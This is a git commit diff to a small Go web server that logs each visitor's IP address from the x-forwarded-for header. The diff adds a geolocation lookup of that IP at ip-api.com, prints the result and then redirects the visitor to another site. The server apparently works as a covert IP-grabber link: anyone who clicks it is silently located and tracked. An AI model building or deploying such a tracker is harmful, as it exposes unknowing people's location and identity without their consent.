5802f14c45a5849adedbbe855818c22e6ad491cc
pai <69026987+ELPanaJose@users.noreply.github.com>
2021-04-24 17:56:16 -0500

    Update main.go

--- main.go
+++ main.go
@@ -1,25 +1,35 @@
 package main
+
 import (
+	"bytes"
+	"encoding/json"
 	"fmt"
-	"net/http"
+	"io/ioutil"
 	"log"
+	"net/http"
 	"os"
 )
+
 func main() {
-	fmt.Println("Use ngrok! `ngrok http 3000`")
-	fmt.Println("server on port 3000")
+	fmt.Println("server on")
 	http.HandleFunc("/", getIP)
+
 	port, ok := os.LookupEnv("PORT")
 
-    if ok == false {
-        port = "3000"
-    }
+	if ok == false {
+		port = "5000"
+	}
 
-    log.Println(http.ListenAndServe(":"+port, nil))
+	log.Println(http.ListenAndServe(":"+port, nil))
 }
 
 func getIP(w http.ResponseWriter, r *http.Request) {
 	ip := r.Header.Get("x-forwarded-for")
-	log.Println("new ip : ", ip)
-	http.Redirect(w, r, "https://paiwebb.herokuapp.com/", 301)
+	log.Println("new ip : " + ip)
+	resp, _ := http.Get("http://ip-api.com/json/"+ip) //hace el request
+	outJson, _ := ioutil.ReadAll(resp.Body)                 // decodifica el request
+	var out bytes.Buffer                                    // es el out de la funcion de abajo
+	json.Indent(&out, outJson, "", "\t")                    // imprime bonito el request
+	fmt.Println(string(out.Bytes()))                        // imprime el request
+	http.Redirect(w, r, "https://monda3213.net/", 301)
 }
